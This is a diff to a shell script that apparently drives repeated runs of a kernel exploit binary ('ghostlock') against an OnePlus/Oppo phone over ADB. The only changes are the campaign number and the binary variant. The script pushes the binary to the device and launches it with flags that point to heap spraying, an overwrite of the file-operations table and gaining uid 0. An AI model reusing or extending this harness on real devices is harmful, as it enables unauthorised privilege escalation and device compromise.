@@ -3,7 +3,7 @@
 ADB=./adb_local.exe
 DEV=192.168.1.2:5555
 cd "$(dirname "$0")" 2>/dev/null || cd "/c/Users/LENOVO/Desktop/HILY installer/Oppo/ghostlock-oneplus"
-RESULTS=/tmp/campaign44_results.txt
+RESULTS=/tmp/campaign45_results.txt
 echo "campaign start $(date)" > $RESULTS
 
 fire_once() {
@@ -20,11 +20,11 @@ fire_once() {
 
   # ensure binary exists (journal rollback protection)
   $ADB -s $DEV shell "test -x /data/local/tmp/gl_jc3b" >/dev/null 2>&1 || {
-    MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL="*" $ADB -s $DEV push ghostlock-cph2521-jc3a /data/local/tmp/gl_jc3b >/dev/null 2>&1
+    MSYS_NO_PATHCONV=1 MSYS2_ARG_CONV_EXCL="*" $ADB -s $DEV push ghostlock-cph2521-jc3b /data/local/tmp/gl_jc3b >/dev/null 2>&1
     $ADB -s $DEV shell "chmod 755 /data/local/tmp/gl_jc3b; sync" >/dev/null 2>&1
   }
 
-  local L="c44_${n}_$(date +%H%M%S)"
+  local L="c45_${n}_$(date +%H%M%S)"
   $ADB -s $DEV shell "cd /data/local/tmp; nohup sh -c 'timeout 300 env MODE4_ONLY=1 MODE4_SLIDE_SWAP=1 WRITE_PROOF_TARGET=fops WRITE_PROOF_SHAPE=left MODE4_JC2=1 MODE4_JC2_MAIN=1 MODE4_JC2_QUIET_ENTRY=1 MODE4_JC2_MIDSTAMP_UNLOCK=1 MODE4_GHOST_PRIO=1 MODE4_OWNER_TASK=1 MODE4_W0TASK_FAKE=1 MODE4_CAPSONLY=1 MODE4_CAPS_CHILD=1 PSELECT_SHIFT=0 SPRAY_ALIAS_MAX=0 FOPS_MAX_ATTEMPTS=24 KPHYS=0xa8000000 UID0_NO_SYNCLOG=1 /data/local/tmp/gl_jc3b' > /data/local/tmp/$L.txt 2>&1 &" >/dev/null 2>&1
   echo "attempt$n: FIRED up=$UP log=$L" >> $RESULTS
 
